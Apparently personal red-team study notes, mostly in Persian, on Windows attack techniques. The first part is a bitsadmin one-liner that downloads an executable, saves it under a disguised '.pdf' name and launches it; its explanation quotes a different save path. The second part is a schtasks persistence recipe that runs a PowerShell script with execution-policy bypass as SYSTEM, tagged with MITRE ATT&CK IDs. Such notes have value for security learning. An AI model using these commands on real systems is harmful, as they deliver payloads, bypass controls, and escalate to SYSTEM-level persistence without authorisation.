
```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\Malisious_payload.pdf bitsadmin /RESUME 1 bitsadmin /complete 1 && conhost c:\data\playfolder\Malisious_payload.pdf
```

# گام‌به‌گام — چه چیزی انجام می‌دهد

دستورات (ترتیب اجرا):

1. `bitsadmin /create 1`  
    یک job جدید در BITS (Background Intelligent Transfer Service) با اسم/شناسه `1` ایجاد می‌کند.
    
2. `bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe`  
    به job شماره `1` می‌گوید که فایل از URL داده‌شده دانلود شود و در مسیر محلی `c:\data\playfolder\autoruns.exe` ذخیره شود.
    
3. `bitsadmin /RESUME 1`  
    شروع/ادامهٔ دانلود (resume) آن job را می‌زند — یعنی انتقال آغاز می‌شود.
    
4. `bitsadmin /complete 1`  
    با این دستور job به‌عنوان «کامل‌شده» بسته می‌شود و فایل نهایی قابل‌استفاده می‌شود.
    

نکته: مهاجم می‌تواند پس از دانلود، با یک فرمان جدا (مثلاً اجرای `cmd.exe` یا اجرای فایل exe دانلودشده) اقدام به راه‌اندازی payload کند. در مثال تو اشاره شد «add cmd.exe to the job, configure the job to run the target command» — BITS را می‌توان برای دانلود و سپس اجرای فایل‌ها در حالات خاص یا همراه با دیگر مکانیزم‌ها به کار برد.


---

یکی از روش های presistance که وجود دارد و APT ها ازش استفاده میکنند این است که وقتی Privilege انجام دهیم و سطح دسترسی Admin رو بگیریم میتونیم بیایم و با ساختن یک اسکجول تسک اون تسکی رو که میسازیم با سطج دسترسی system باشد 

Scheduled Task/job =>

```cmd

schtasks /Create /SC DAILY /TN "MyTask" /TR "powershell.exe -ExecutionPolicy Bypass -File 'c:\users\public\backup.ps1'" /ST 00:01 /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /IT

```
/RU ----> Run As   

با داشتن سطح دسترسی Administrator میتونیم بیایم و سطح دسترسی مون رو درست کردن یک تسک به SYSTEM برسونیم 

```
 schtasks /Query /TN "MyTask"
```

```
 schtasks /Run /TN "MyTask"

Cron T1053.003 ----> Mitre Attack 
```

  

### Scheduled Task T1053.005
